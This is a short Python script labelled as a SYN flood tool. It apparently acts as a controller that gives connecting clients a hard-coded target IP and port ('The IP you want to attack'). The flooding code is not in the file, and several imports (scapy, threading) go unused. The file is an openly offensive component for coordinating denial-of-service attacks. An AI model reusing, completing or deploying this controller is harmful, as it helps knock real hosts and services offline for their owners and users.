#!/usr/bin/python3
# Emre Ovunc
# info@emreovunc.com
# Python3 SYN Flood Tool

from os import system
from sys import stdout
from scapy.all import *
from random import randint
import threading
import socket 


numberOfThreads = 6

def main():
	#dstIP,dstPort = info()
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind(("127.0.0.1", 8181))
	threads = []
	while(True):
		try:
			attackIP = "192.168.2.216" #The IP you want to attack
			attackIP = attackIP.encode()
			attackPort = "5555" #The port you want to attack
			attackPort = attackPort.encode()
			server.listen(10)

			client,addr = server.accept()
	
			client.send(attackIP)
			print(client.recv(200))
			client.send(attackPort)
			print(client.recv(200))
			client.close()
			continue
		except Exception as e:
			print("The error is :",e)

if __name__ == '__main__':
	main()

